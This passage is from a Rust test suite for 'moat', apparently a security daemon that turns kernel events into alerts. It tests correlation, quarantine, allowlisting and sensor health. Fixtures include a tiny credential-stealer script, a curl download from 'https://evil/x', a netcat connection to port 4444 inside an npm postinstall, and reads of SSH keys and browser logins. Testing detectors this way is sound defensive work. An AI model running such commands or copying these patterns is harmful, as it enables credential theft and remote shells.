                    crate::contain::StepFact { family: "exec".into(), novel: true, pid: 1 },
                    crate::contain::StepFact { family: "persist".into(), novel: true, pid: 2 },
                ]
            )
            .is_ok(),
            "precondition: this is a shape the kill gate passes"
        );
        d.quarantine_chain_artifacts(&c);
        assert!(!dropper.exists(), "the dropped binary was moved aside");
        assert_eq!(d.find_alert(&a.id).unwrap().action_taken, "quarantined");
    }

    /// A `signal` step's file is not taken on a `high` chain.
    ///
    /// A signal rule is right about what it saw and weak about what it means,
    /// and `moat-exec-untrusted-tmpfs` names the binary a build just produced
    /// hundreds of times a day. Acting on the file a weak rule pointed at, on a
    /// correlation that only reached `high`, is the one shape where moat can
    /// destroy work while being technically correct about every step.
    #[test]
    fn a_signal_steps_file_is_only_quarantined_when_the_chain_is_critical() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.contain.enabled = true;
        let built = dir.path().join("test-binary");

        for (severity, must_survive) in [("high", true), ("critical", false)] {
            std::fs::write(&built, b"ELF-ish").unwrap();
            let mut a = stored_alert(
                &mut d,
                &format!("01QE{:022}", severity.len()),
                "moat-exec-untrusted-tmpfs",
                "exec",
                &built.to_string_lossy(),
                crate::rarity::Rarity::FirstSeen,
            );
            // The declaration, on the record.
            a.tier = crate::policy::TIER_SIGNAL.into();
            d.store.append_alert(&a).unwrap();
            let b = stored_alert(
                &mut d,
                &format!("01QF{:022}", severity.len()),
                "moat-persist-autostart-write",
                "persist",
                &dir.path().join("no-such-file").to_string_lossy(),
                crate::rarity::Rarity::FirstSeen,
            );
            let c = chain_over(&d, &[a.clone(), b], severity);
            d.quarantine_chain_artifacts(&c);
            assert_eq!(
                built.exists(),
                must_survive,
                "a {} chain and a signal step: file should {}",
                severity,
                if must_survive { "survive" } else { "be taken" }
            );
        }
    }

    /// A rule that is on and cannot fire must say so.
    #[test]
    fn rules_needing_process_cred_are_reported_as_inert_without_it() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _cfg) = dev_daemon(dir.path());

        // Point at a conf.d of our own. Reading the real /etc made this pass
        // only on a machine where the fragment was absent -- it failed the
        // moment the fix was actually deployed, which is the worst possible
        // time for a test to change its mind.
        let confd = dir.path().join("conf.d");
        std::fs::create_dir_all(&confd).unwrap();
        d.cfg.paths.export_allowlist = confd.join("export-allowlist");
        d.cfg.rules.exec_memfd = true;
        d.cfg.rules.exec_privileges_raised = true;

        let inert = d.inert_rules();
        assert_eq!(inert.len(), 2, "no fragment: both rules are inert, {:?}", inert);
        assert!(inert.iter().any(|r| r.contains("memfd")), "{:?}", inert);

        // And with the flag actually enabled, nothing is inert.
        std::fs::write(confd.join("enable-process-cred"), "true\n").unwrap();
        assert!(d.inert_rules().is_empty(), "the fragment makes both rules live");

        // Anything other than `true` is not enabled -- a fragment someone set
        // to `false` must not read as working.
        std::fs::write(confd.join("enable-process-cred"), "false\n").unwrap();
        assert_eq!(d.inert_rules().len(), 2, "false is not true");

        // Switching a rule off is not the same as it being broken: nothing to
        // report, because nothing is claiming to watch.
        d.cfg.rules.exec_memfd = false;
        d.cfg.rules.exec_privileges_raised = false;
        assert!(d.inert_rules().is_empty(), "a rule that is off is not inert");
    }

    /// The counterpart: an alert the *user* allowlisted is still context, so
    /// the fix above did not quietly turn the allowlist into a chain trigger.
    #[test]
    fn an_allowlisted_alert_is_still_only_context() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        std::fs::write(
            d.cfg.paths.allowlist_dir.join("user.toml"),
            "[[rule]]\nname = \"moat-cred-project-token-read\"\n",
        )
        .unwrap();
        d.reload_allowlist();

        let node = ProcInfo {
            exec_id: "e-node".into(),
            pid: 1_876_167,
            uid: 1000,
            exe: "/usr/bin/node".into(),
            args: String::new(),
            cwd: "/tmp/lab".into(),
            start_time: util::now_rfc3339(),
            parent_exec_id: None,
            exited_at: None,
            exit_signal: None,
            exe_note: None,
            sid: None,
            tty: None,
        };
        let finding = |rule: &str, family: &str, severity: &str, path: &str| {
            let mut f = Finding::new(rule, crate::policy::PolicyMeta::fallback(rule), node.clone());
            f.meta.family = family.into();
            f.meta.severity = severity.into();
            f.hook = "file_post_open".into();
            f.file = Some(crate::alert::FileRef { path: path.into(), sha256: None });
            f
        };
        let a = d
            .emit(finding("moat-persist-git-config-write", "persist", "high", "/tmp/lab/.git/config"))
            .unwrap();
        d.emit(finding("moat-cred-project-token-read", "cred", "medium", "/tmp/lab/.env"))
            .unwrap();

        let pa = d.store.load().into_iter().find(|x| x.id == a).unwrap();
        assert!(
            pa.chain.is_none(),
            "an allowlisted second family must not create a chain"
        );
        assert_eq!(d.status()["chains_formed"], 0);
    }

    /// The correlator must never merge two unrelated trees. Replaying the same
    /// install under a *different* npm gives a second chain, not a bigger one.
    #[test]
    fn a_second_unrelated_install_is_a_second_chain() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        // The two installs replay milliseconds apart, so without this the
        // second one folds into the first by (rule, exe, file) and never
        // produces the alerts a second chain would be made of. The question
        // here is about trees, not about dedupe.
        d.cfg.thresholds.dedupe_secs = 0;
        let text = std::fs::read_to_string(&d.cfg.paths.tetragon_log).unwrap();
        for line in text.lines() {
            d.handle_line(line);
        }
        // Same events, every exec_id and pid moved into a second install.
        for line in text.lines() {
            d.handle_line(&line.replace("bWFyczoxMjM0", "bWFyczo5OTk5").replace("412", "512"));
        }
        let chains: std::collections::HashSet<String> = d
            .store
            .load()
            .into_iter()
            .filter_map(|a| a.chain.map(|c| c.id))
            .collect();
        assert_eq!(chains.len(), 2, "two installs are two stories, not one");
    }

    /// Alert ids are the timeline, so a burst inside one millisecond must still
    /// come back in the order it was emitted. `Ulid::new()` only orders by the
    /// embedded millisecond and tied on the random suffix, which made
    /// `store.load().next_back()` — and `moatctl list`'s "newest last" — a coin
    /// flip for same-millisecond alerts.
    #[test]
    fn alert_ids_are_monotonic_inside_one_millisecond() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let ids: Vec<String> = (0..500).map(|_| d.next_id()).collect();
        // Fast enough that the millisecond prefix repeats; if it never did the
        // test would pass for the wrong reason.
        let prefixes: std::collections::HashSet<&str> =
            ids.iter().map(|i| &i[..10]).collect();
        assert!(
            prefixes.len() < ids.len(),
            "no two ids shared a millisecond, so this proves nothing"
        );
        let mut sorted = ids.clone();
        sorted.sort();
        assert_eq!(ids, sorted, "ids must sort into the order they were issued");
    }

    /// The regression for the 2026-09-03 outage: Tetragon crash-looped for 25
    /// minutes while `status` said "running" and the shield stayed green,
    /// because both signals were a file's existence and a log's mtime — and a
    /// crash loop keeps both fresh. Health has to be counted from the kernel.
    #[test]
    fn sensor_health_is_counted_from_the_kernel_not_guessed() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let expected = d.policies.len();
        assert!(expected > 0, "fixture must ship policies");

        let pins = dir.path().join("bpf");
        std::fs::create_dir_all(&pins).unwrap();
        d.cfg.paths.tetragon_bpf_dir = pins.clone();

        // Nothing pinned: the sensor is down, however healthy systemd looks.
        assert_eq!(d.sensors_loaded(), Some(0));
        assert_eq!(d.tetragon_state(), "down");
        assert!(d.sensor_unhealthy());

        // Every policy pinned: running.
        for name in d.policies.names() {
            std::fs::create_dir_all(pins.join(&name)).unwrap();
        }
        // Tetragon's own sensors sit here too and must not be counted as ours.
        std::fs::create_dir_all(pins.join("__base__")).unwrap();
        assert_eq!(d.sensors_loaded(), Some(expected));
        assert_eq!(d.tetragon_state(), "running");
        assert!(!d.sensor_unhealthy());

        // One policy fails to attach — the exact E2BIG shape — and the count
        // names how many of how many, rather than rounding up to "running".
        std::fs::remove_dir_all(pins.join(d.policies.names()[0].clone())).unwrap();
        assert_eq!(
            d.tetragon_state(),
            format!("degraded {}/{}", expected - 1, expected)
        );
        assert!(d.sensor_unhealthy());

        // bpffs unreadable is not the same claim as "zero loaded". With the
        // socket there we genuinely cannot tell, so say "unverified" and do not
        // cry wolf; with nothing there at all the old signals still convict.
        d.cfg.paths.tetragon_bpf_dir = dir.path().join("does-not-exist");
        assert_eq!(d.sensors_loaded(), None);

        d.cfg.paths.tetragon_socket = dir.path().join("tetragon.sock");
        std::fs::write(&d.cfg.paths.tetragon_socket, b"").unwrap();
        assert_eq!(d.tetragon_state(), "unverified");
        assert!(!d.sensor_unhealthy(), "unverified is not evidence of an outage");

        std::fs::remove_file(&d.cfg.paths.tetragon_socket).unwrap();
        d.cfg.paths.tetragon_log = dir.path().join("no-such.log");
        assert_eq!(d.tetragon_state(), "stopped");
        assert!(d.sensor_unhealthy());
    }

    /// The daemon must not alert on its own reads. An incident snapshot reads
    /// /proc/<pid>/{environ,status,cmdline,fd} for the alerting process and
    /// every ancestor, so any file rule covering those paths turns one alert
    /// into an unbounded chain of them.
    #[test]
    fn moatd_never_alerts_on_its_own_reads() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let me = std::process::id();

        let line = |pid: u32| {
            format!(
                r#"{{"process_kprobe":{{"process":{{"exec_id":"e-{pid}","pid":{pid},"uid":0,"binary":"/usr/bin/moatd","arguments":"run","cwd":"/","start_time":"2026-09-03T16:21:00.000000000Z"}},"function_name":"security_file_post_open","policy_name":"moat-cred-ssh-private-key-read","args":[{{"file_arg":{{"path":"/home/dan/.ssh/id_ed25519"}}}},{{"int_arg":4}}]}},"time":"2026-09-03T16:21:00.100Z"}}"#
            )
        };

        // Somebody else doing it is exactly what the rule is for.
        let other = if me == 4242 { 4243 } else { 4242 };
        let n = d.store.load().len();
        d.handle_line(&line(other));
        assert!(d.store.load().len() > n, "another process still alerts");

        // Us doing it is the loop, and must produce nothing at all.
        let n = d.store.load().len();
        d.handle_line(&line(me));
        assert_eq!(d.store.load().len(), n, "moatd must not alert on itself");
    }

    /// The feedback loop moat built for itself. Staging an incident copies the
    /// credential file into /var/lib/moat/incidents/<id>/file/<name>; the next
    /// recursive search reads that copy; the read raises a fresh cred alert;
    /// that alert stages another copy. Half of every browser-secret alert on
    /// this machine on 2026-09-04 was this loop eating its own tail.
    #[test]
    fn a_read_of_moats_own_evidence_store_is_never_a_credential_alert() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());
        let staged = cfg
            .paths
            .state_dir
            .join("incidents/01ABC/file/Login Data")
            .to_string_lossy()
            .into_owned();

        let read = |policy: &str, path: &str| {
            format!(
                r#"{{"process_kprobe":{{"process":{{"exec_id":"r1","pid":9400,"uid":1000,"binary":"/usr/bin/rg","arguments":"--hidden --glob !.git","cwd":"/home/testuser","start_time":"2026-09-04T23:15:00.000000000Z"}},"function_name":"security_file_post_open","policy_name":"{}","args":[{{"file_arg":{{"path":"{}"}}}},{{"int_arg":4}}]}},"time":"2026-09-04T23:15:43.100Z"}}"#,
                policy, path
            )
        };

        let n = d.store.load().len();
        d.handle_line(&read("moat-cred-browser-secrets-read", &staged));
        assert_eq!(
            d.store.load().len(),
            n,
            "reading moat's own staged evidence must never raise a cred alert"
        );

        // The real file it was copied FROM is still the whole point of the rule.
        d.handle_line(&read(
            "moat-cred-browser-secrets-read",
            "/home/testuser/.config/google-chrome/Default/Login Data",
        ));
        assert_eq!(d.store.load().len(), n + 1, "the rule still guards real browser secrets");

        // And a rule whose SUBJECT is that directory keeps seeing it, or the
        // cut above would have quietly disarmed the tamper detection.
        let unlink = format!(
            r#"{{"process_kprobe":{{"process":{{"exec_id":"r2","pid":9401,"uid":0,"binary":"/usr/bin/rm","arguments":"-rf","cwd":"/","start_time":"2026-09-04T23:16:00.000000000Z"}},"function_name":"security_path_unlink","policy_name":"moat-rootkit-evidence-tamper","args":[{{"path_arg":{{"path":"{}"}}}}]}},"time":"2026-09-04T23:16:00.100Z"}}"#,
            staged
        );
        d.handle_line(&unlink);
        assert_eq!(
            d.store.load().len(),
            n + 2,
            "evidence-tamper must still fire on moat's own directory"
        );
    }

    /// The kernel matches a history file by name alone (`Postfix
    /// /.bash_history`), so it fires on that name anywhere on the filesystem.
    /// On 2026-09-04 moat's own test suite tripped it -- `rm -rf` on a sandbox
    /// tempdir removed the throwaway $HOME inside it -- and because the rule is
    /// in the `rootkit` family that raised an ordinary build into a HIGH chain.
    #[test]
    fn a_history_file_that_is_nobodys_history_is_not_tampering() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.homes = vec!["/home/testuser".into()];
        d.provenance.set_homes(&d.homes);
        d.subvols = vec![("/@home".into(), "/home".into()), ("/@".into(), "/".into())];

        let ev = |path: &str| {
            format!(
                r#"{{"process_kprobe":{{"process":{{"exec_id":"h1","pid":9300,"uid":1000,"binary":"/usr/bin/rm","arguments":"-rf --","cwd":"/tmp","start_time":"2026-09-04T21:25:00.000000000Z"}},"function_name":"security_path_unlink","policy_name":"moat-rootkit-history-tamper","args":[{{"path_arg":{{"path":"{}"}}}}]}},"time":"2026-09-04T21:25:00.100Z"}}"#,
                path
            )
        };

        // The exact event from 2026-09-04. Nobody's trail, so none was covered.
        let n = d.store.load().len();
        d.handle_line(&ev("/moat-sandbox-test.VBeheQGq/home/.bash_history"));
        assert_eq!(
            d.store.load().len(),
            n,
            "a .bash_history inside a scratch dir is not anyone's history"
        );

        // The same `rm` against a real account still alerts -- and the
        // subvolume spelling the sensor actually emits must not hide it, which
        // is the way this fix could have quietly killed the rule instead.
        d.handle_line(&ev("/@home/testuser/.bash_history"));
        let alerts = d.store.load();
        assert_eq!(
            alerts.len(),
            n + 1,
            "erasing a real account's history is the entire point of the rule"
        );
        assert_eq!(
            alerts.last().unwrap().file.as_ref().unwrap().path,
            "/home/testuser/.bash_history",
            "the path shown is the one a person would recognise, not /@home/..."
        );
    }

    /// A finding at high severity captures an incident snapshot, and that
    /// snapshot sha256s the file the event named. So a fixture that names a
    /// real path makes the test suite *open that file* — and every fixture
    /// here is a credential path by construction. Naming the developer's own
    /// ~/.ssh/id_rsa meant `cargo test` read their private key on every run,
    /// and raised three real moat-cred-ssh-private-key-read alerts while doing
    /// it. Fixture paths must not exist.
    #[test]
    fn no_test_fixture_names_a_path_that_exists_on_this_machine() {
        let src = include_str!("engine.rs");
        let mut bad = Vec::new();
        for cap in src.split('"').filter(|s| s.starts_with("/home/") || s.starts_with("/root/")) {
            let path = cap.split_whitespace().next().unwrap_or(cap);
            // Directories are fine and expected: tests name $HOME and a cwd.
            // A regular *file* is the hazard, because that is what gets opened.
            if std::path::Path::new(path).is_file() {
                bad.push(path.to_string());
            }
        }
        bad.sort();
        bad.dedup();
        assert!(
            bad.is_empty(),
            "fixtures name real paths on this machine, so the suite reads them: {:?}",
            bad
        );
    }

    /// End to end: a cred alert's bundle stages the suspect so the agent can
    /// actually deobfuscate it, and names the credential as withheld.
    ///
    /// The fixture policy requires the literal prefix `/home/dan/.ssh/id_`, so
    /// the target path is a name under it that does not exist — this test will
    /// not read a real private key to prove a point about not reading private
    /// keys. That the *bytes* of a real secret never leave is proved with real
    /// files in `evidence::tests::staging_copies_the_actor_and_withholds_the_secret`.
    #[test]
    fn a_bundle_stages_the_suspect_and_withholds_the_credential() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());

        let suspect = dir.path().join("stealer.mjs");
        std::fs::write(&suspect, b"const p=atob('c3RlYWw=');require('fs').readFileSync(p)").unwrap();
        let victim = "/home/dan/.ssh/id_rsa_moat_fixture";

        d.handle_line(&format!(
            r#"{{"process_lsm":{{"process":{{"exec_id":"b-1","pid":5150,"uid":1000,"binary":"{}","cwd":"/tmp","start_time":"2026-09-03T16:21:00.000000000Z"}},"function_name":"file_post_open","policy_name":"moat-cred-ssh-private-key-read","args":[{{"file_arg":{{"path":"{}"}}}},{{"int_arg":4}}]}},"time":"2026-09-03T16:21:00.100Z"}}"#,
            suspect.display(),
            victim
        ));
        let id = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-cred-ssh-private-key-read")
            .expect("the alert")
            .id;

        let path = d.write_bundle(&id).expect("bundle");
        let md = std::fs::read_to_string(&path).unwrap();

        // The suspect is staged and named, so the agent can read and decode it.
        assert!(md.contains("## Files"), "{}", md);
        assert!(md.contains("actor.stealer.mjs.suspect"), "{}", md);
        let staged = path.parent().unwrap().join("actor.stealer.mjs.suspect");
        assert!(staged.exists(), "the suspect script sits beside the bundle");
        assert!(String::from_utf8_lossy(&std::fs::read(&staged).unwrap()).contains("atob"));
        use std::os::unix::fs::PermissionsExt;
        let mode = std::fs::metadata(&staged).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode, 0o440, "staged hostile files are read-only");
        assert_eq!(mode & 0o111, 0, "and never executable");
        // The comment above says "so the agent can read and decode it", and the
        // agent runs as the user while moatd runs as root -- so group-readable
        // is not a detail, it is the difference between staging working and
        // being an elaborate no-op.
        assert_ne!(mode & 0o040, 0, "the group the agent is in must be able to open it");

        // The credential is named and explicitly withheld, and the agent is
        // told not to go and open it itself.
        assert!(md.contains("contents withheld"), "{}", md);
        assert!(md.contains(victim), "the path is still disclosed: {}", md);
        assert!(
            md.contains("do not try to read the original path"),
            "{}",
            md
        );
    }

    fn replay(d: &mut Daemon) {
        let text = std::fs::read_to_string(&d.cfg.paths.tetragon_log).unwrap();
        for line in text.lines() {
            d.handle_line(line);
        }
    }

    #[test]
    fn the_sample_log_produces_explainable_alerts() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.homes = vec!["/home/dan".into()];
        replay(&mut d);

        let alerts = d.store.load();
        let rules: Vec<&str> = alerts.iter().map(|a| a.rule.as_str()).collect();
        assert!(rules.contains(&"moat-cred-ssh-private-key-read"));
        assert!(rules.contains(&"moat-shell-reverse-shell-connect"));
        assert!(rules.contains(&"moat-x-ai-cli-headless"));

        for a in &alerts {
            assert!(!a.explain.what.is_empty(), "{} has no what", a.rule);
            assert!(!a.explain.why.is_empty(), "{} has no why", a.rule);
            assert!(a.explain.evidence.len() >= 3, "{} has thin evidence", a.rule);
            assert!(!a.explain.next.is_empty());
            assert!(!a.explain.if_expected.options.is_empty());
            assert_eq!(a.v, 1);
            assert!(!a.id.is_empty());
        }
    }

    #[test]
    fn ancestry_reaches_the_package_manager() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        replay(&mut d);
        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-cred-ssh-private-key-read")
            .unwrap();
        let exes: Vec<String> = a.process.ancestry.iter().map(|x| x.exe.clone()).collect();
        assert!(exes.iter().any(|e| e.ends_with("/npm")), "{:?}", exes);
        assert!(a.summary.contains("Parent chain: fish -> npm -> sh -> node"));
    }

    #[test]
    fn a_kill_is_only_recorded_after_the_exit_signal() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        replay(&mut d);
        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-shell-reverse-shell-connect")
            .unwrap();
        // The event carried KPROBE_ACTION_SIGKILL and the sample log has the
        // matching SIGKILL exit, so this one is confirmed.
        assert_eq!(a.action_taken, "killed");
        assert!(a
            .explain
            .evidence
            .iter()
            .any(|e| e.contains("only recorded once process_exit reports SIGKILL")));

        // Without the exit line it must stay "none".
        let dir2 = tempfile::tempdir().unwrap();
        let (mut d2, _) = dev_daemon(dir2.path());
        let text = std::fs::read_to_string(&d2.cfg.paths.tetragon_log).unwrap();
        for line in text.lines().filter(|l| !l.contains("process_exit")) {
            d2.handle_line(line);
        }
        let a2 = d2
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-shell-reverse-shell-connect")
            .unwrap();
        assert_eq!(a2.action_taken, "none");
    }

    /// BASELINE §8: a suppressed alert is recorded, greyed out and uncounted —
    /// it is not dropped. A suppression the user cannot see is exactly the kind
    /// of silence this project promises not to produce.
    #[test]
    fn the_allowlist_records_a_suppressed_alert_instead_of_dropping_it() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());
        std::fs::write(
            cfg.paths.allowlist_dir.join("user.toml"),
            "# expected: our own node\n[[rule]]\nname = \"moat-cred-ssh-private-key-read\"\nexe = \"*/bin/node\"\n",
        )
        .unwrap();
        d.reload_allowlist();
        replay(&mut d);

        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-cred-ssh-private-key-read")
            .expect("still on the timeline");
        assert_eq!(a.suppressed_by.as_deref(), Some("user.toml#1"));
        assert!(a
            .explain
            .evidence
            .iter()
            .any(|e| e.contains("suppressed by allowlist entry user.toml#1")));
        // Out of the badge, and counted separately from real alerts.
        let counted = d
            .store
            .load()
            .iter()
            .filter(|x| !x.acked && !x.is_suppressed() && x.surface == "alerts" && x.severity == a.severity)
            .count() as u64;
        assert_eq!(d.store.unacked()[&a.severity], counted, "suppressed alerts are not counted");
        assert!(d.alerts_suppressed >= 1);
    }

    #[test]
    fn repeats_inside_the_window_fold_into_a_count() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let line = std::fs::read_to_string(&d.cfg.paths.tetragon_log)
            .unwrap()
            .lines()
            .find(|l| l.contains("moat-cred-ssh-private-key-read"))
            .unwrap()
            .to_string();
        for _ in 0..5 {
            d.handle_line(&line);
        }
        let alerts: Vec<Alert> = d
            .store
            .load()
            .into_iter()
            .filter(|a| a.rule == "moat-cred-ssh-private-key-read")
            .collect();
        assert_eq!(alerts.len(), 1, "one alert, not five");
        assert_eq!(alerts[0].count, Some(5));
    }

    #[test]
    fn a_non_moat_policy_is_enrichment_only() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let line = r#"{"process_kprobe":{"process":{"exec_id":"zz","pid":1,"uid":0,"binary":"/usr/bin/x"},"function_name":"security_file_permission","policy_name":"some-other-policy","args":[{"file_arg":{"path":"/etc/shadow"}}]},"time":"2026-09-03T16:00:00Z"}"#;
        d.handle_line(line);
        assert!(d.store.load().is_empty());
        assert!(d.table.get("zz").is_some(), "still used for enrichment");
    }

    /// The event that started the re-validation work: the SSH-key policy's name
    /// on a sysfs path its own `Prefix` selector cannot produce.
    #[test]
    fn a_kernel_match_its_own_selector_rejects_becomes_a_sensor_mismatch() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let line = r#"{"process_lsm":{"process":{"exec_id":"zz1","pid":4242,"uid":1000,"binary":"/usr/bin/node","arguments":"server.js","cwd":"/home/dan","start_time":"2026-09-03T16:21:06.900000000Z"},"function_name":"file_post_open","policy_name":"moat-cred-ssh-private-key-read","args":[{"file_arg":{"path":"/sys/devices/system/cpu/online"}},{"int_arg":4}]},"time":"2026-09-03T16:21:07.000Z"}"#;
        d.handle_line(line);

        let alerts = d.store.load();
        assert_eq!(alerts.len(), 1);
        let a = &alerts[0];
        assert_eq!(a.rule, "moat-x-sensor-mismatch");
        assert_eq!(a.severity, "low");
        assert_eq!(a.file.as_ref().unwrap().path, "/sys/devices/system/cpu/online");
        let ev = a.explain.evidence.join("\n");
        assert!(ev.contains("policy: moat-cred-ssh-private-key-read"), "{}", ev);
        assert!(ev.contains("/sys/devices/system/cpu/online"), "{}", ev);
        assert!(ev.contains("matchArgs index 0"), "{}", ev);
        assert!(a.explain.why.contains("should have rejected"));
        assert!(
            !alerts.iter().any(|x| x.rule == "moat-cred-ssh-private-key-read"),
            "the policy alert itself must NOT be raised"
        );
    }

    #[test]
    fn a_path_the_policy_does_name_still_alerts_normally() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let line = r#"{"process_lsm":{"process":{"exec_id":"zz2","pid":4243,"uid":1000,"binary":"/usr/bin/node","arguments":"x.js","cwd":"/home/dan","start_time":"2026-09-03T16:21:06.900000000Z"},"function_name":"file_post_open","policy_name":"moat-cred-ssh-private-key-read","args":[{"file_arg":{"path":"/home/dan/.ssh/id_ed25519"}},{"int_arg":4}]},"time":"2026-09-03T16:21:07.000Z"}"#;
        d.handle_line(line);
        let rules: Vec<String> = d.store.load().into_iter().map(|a| a.rule).collect();
        assert_eq!(rules, vec!["moat-cred-ssh-private-key-read"]);
    }

    /// `moat-net-suspicious-port-egress` fires for every process at medium;
    /// being inside an install is what makes it high.
    #[test]
    fn suspicious_port_egress_is_escalated_inside_a_package_subtree() {
        fn egress_line(exec_id: &str, pid: u32) -> String {
            format!(
                r#"{{"process_kprobe":{{"process":{{"exec_id":"{}","pid":{},"uid":1000,"binary":"/usr/bin/node","arguments":"install.js","cwd":"/home/dan/proj","start_time":"2026-09-03T16:21:06.900000000Z"}},"function_name":"tcp_connect","policy_name":"{}","args":[{{"sock_arg":{{"family":"AF_INET","daddr":"185.220.101.55","dport":4444,"saddr":"192.168.1.20","sport":51234}}}}]}},"time":"2026-09-03T16:21:07.000Z"}}"#,
                exec_id, pid, SUSPICIOUS_PORT_EGRESS
            )
        }

        // Outside an install: whatever the policy annotations say, unchanged.
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.handle_line(&egress_line("out1", 5000));
        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == SUSPICIOUS_PORT_EGRESS)
            .expect("the policy alert is raised for every process");
        // The rule says medium; `/usr/bin/node` is official in the fixture, and
        // `net` is one of the families BASELINE §2 lets provenance soften.
        assert_eq!(a.severity_base, "medium");
        assert_eq!(a.severity, "low");
        assert!(a.severity_reason.contains("actor is official"), "{}", a.severity_reason);
        assert!(!a.explain.evidence.iter().any(|e| e.contains("raised from")));

        // Inside an npm install: high, with the root named.
        let dir2 = tempfile::tempdir().unwrap();
        let (mut d2, _) = dev_daemon(dir2.path());
        d2.handle_line(r#"{"process_exec":{"process":{"exec_id":"e-npm","pid":41201,"uid":1000,"binary":"/usr/bin/npm","arguments":"install","cwd":"/home/dan/proj","start_time":"2026-09-03T16:21:01.000000000Z"}}}"#);
        d2.handle_line(r#"{"process_exec":{"process":{"exec_id":"in1","pid":5001,"uid":1000,"binary":"/usr/bin/node","arguments":"install.js","cwd":"/home/dan/proj","start_time":"2026-09-03T16:21:06.900000000Z","parent_exec_id":"e-npm"}}}"#);
        d2.handle_line(&egress_line("in1", 5001));
        let a = d2
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == SUSPICIOUS_PORT_EGRESS)
            .unwrap();
        // And a package install is never downgraded, however official the actor.
        assert_eq!(a.severity, "high");
        assert_eq!(a.context, crate::context::Context::PkgInstall);
        let ev = a.explain.evidence.join("\n");
        assert!(ev.contains("package-manager subtree root: /usr/bin/npm"), "{}", ev);
        assert!(ev.contains("raised from medium to high"), "{}", ev);
    }

    /// The four rules that replaced the deleted kernel policies work off
    /// `process_exec` alone, so they need no policy to be loaded at all.
    #[test]
    fn the_pkg_subtree_rules_fire_from_exec_events_only() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        for (id, pid, exe, args, parent) in [
            ("x-fish", 41101, "/usr/bin/fish", "", ""),
            ("x-npm", 41201, "/usr/bin/npm", "install", "x-fish"),
            ("x-sh", 41240, "/usr/bin/sh", "-c postinstall", "x-npm"),
            ("x-curl", 41241, "/usr/bin/curl", "-sL https://evil/x", "x-sh"),
            ("x-nc", 41242, "/usr/bin/nc", "1.2.3.4 4444", "x-sh"),
            ("x-cli", 41243, "/usr/bin/claude", "-p fix", "x-sh"),
        ] {
            d.handle_line(&format!(
                r#"{{"process_exec":{{"process":{{"exec_id":"{}","pid":{},"uid":1000,"binary":"{}","arguments":"{}","cwd":"/home/dan/proj","start_time":"2026-09-03T16:21:06.900000000Z"{}}}}}}}"#,
                id,
                pid,
                exe,
                args,
                if parent.is_empty() {
                    String::new()
                } else {
                    format!(r#","parent_exec_id":"{}""#, parent)
                }
            ));
        }
        let mut rules: Vec<String> = d.store.load().into_iter().map(|a| a.rule).collect();
        rules.sort();
        assert_eq!(
            rules,
            vec![
                "moat-ai-cli-in-pkg-subtree",
                "moat-pkg-subtree-downloader",
                "moat-pkg-subtree-interpreter-spawn",
                "moat-pkg-subtree-netcat-exec",
                // The shell above the agent is npm's, not a person's, so the
                // headless rule speaks up as well. Two rules, two angles.
                "moat-x-ai-cli-headless",
            ]
        );
        // Monitor mode never kills, whatever the rule asked for.
        assert!(d.store.load().iter().all(|a| a.action_taken == "none"));
    }

    /// Spawn a freshly copied binary, retrying `ETXTBSY`.
    ///
    /// `fs::copy` in one test thread and `fork+exec` in another race: the child
    /// inherits the still-open write descriptor and the kernel refuses the
    /// exec. Nothing to do with the daemon, everything to do with running the
    /// suite in parallel.
    fn spawn_retrying_etxtbsy(path: &Path) -> std::process::Child {
        for _ in 0..50 {
            match std::process::Command::new(path).arg("30").spawn() {
                Ok(c) => return c,
                Err(e) if e.raw_os_error() == Some(libc::ETXTBSY) => {
                    std::thread::sleep(Duration::from_millis(20));
                }
                Err(e) => panic!("spawn {}: {}", path.display(), e),
            }
        }
        panic!("{} stayed busy", path.display())
    }

    /// Spawn the victim **and prove /proc still names it**, returning the
    /// process, its pid, its start time in Tetragon's format and its exe.
    ///
    /// The proof matters: this test process runs dozens of threads, pids are
    /// recycled, and a child that lost the race would otherwise be described to
    /// the daemon under some other program's name — which is a broken test, not
    /// a broken rule.
    fn spawn_victim(path: &Path) -> (std::process::Child, u32, String, String) {
        for _ in 0..20 {
            let child = spawn_retrying_etxtbsy(path);
            let pid = child.id();
            let exe = util::proc_exe(pid);
            let start = util::proc_start_nanos(pid);
            match (exe, start) {
                (Some(exe), Some(start)) if Path::new(&exe) == path => {
                    let ts = chrono::DateTime::from_timestamp(
